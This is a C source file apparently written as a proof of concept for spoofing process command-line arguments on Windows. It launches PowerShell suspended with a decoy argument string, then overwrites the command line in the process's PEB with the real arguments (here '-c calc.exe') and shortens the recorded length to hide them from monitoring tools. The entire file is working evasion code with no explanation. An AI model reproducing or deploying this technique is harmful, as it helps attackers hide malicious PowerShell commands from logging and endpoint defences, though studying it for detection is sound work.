#include "Header.h"
#include <stdio.h>


int main() {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(STARTUPINFOW));
    RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);

    wchar_t dummyArgs[] = L"powershell.exe cool argument that is safe";
    wchar_t spoofedWorkingDir[] = L"C:\\Windows\\";
    if (!CreateProcessW(NULL, dummyArgs, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, spoofedWorkingDir, &si, &pi)) {
        printf("[!] Could not create process. Error %d\n", GetLastError());
        return -1;
    }

    printf("PID %d\n", pi.dwProcessId);


    fpNtQueryInformationProcess NtQueryInformationProcess = (fpNtQueryInformationProcess) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        printf("[!] Could not load NtQueryInformationProcess. Error %d\n", GetLastError());
        return -1;
    }

    PEB peb;
    PROCESS_BASIC_INFORMATION pbi;
    RTL_USER_PROCESS_PARAMETERS upp;
    NTSTATUS ntStatus;

    ULONG retLength;

    if ((ntStatus = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLength)) != 0x0) {
        printf("Could not query system information. NTSTATUS 0x%0.8X \n", ntStatus);
        return -1;
    }

    SIZE_T sBytesRead;
    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &sBytesRead)) {
        printf("[!] Could not read PEB. Error %d\n", GetLastError());
        return -1;
    }

    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &sBytesRead)) {
        printf("Could not read PBI. Error %d\n", GetLastError());
        return -1;
    }

    wchar_t realArguments[] = L"powershell.exe -c calc.exe";

    if (!WriteProcessMemory(pi.hProcess, upp.CommandLine.Buffer, realArguments, sizeof(realArguments), &sBytesRead)) {
        printf("Could not write process memory. Error %d\n", GetLastError());
        return -1;
    }

    USHORT newLength = sizeof(L"powershell.exe");
    upp.CommandLine.Length = newLength;

    if (!WriteProcessMemory(pi.hProcess, peb.ProcessParameters, &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &sBytesRead)) {
        printf("[!] Could not alter buffer size. Error %d\n", GetLastError());
        return -1;
    }

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[+] Done\n\n");

    return 0;
}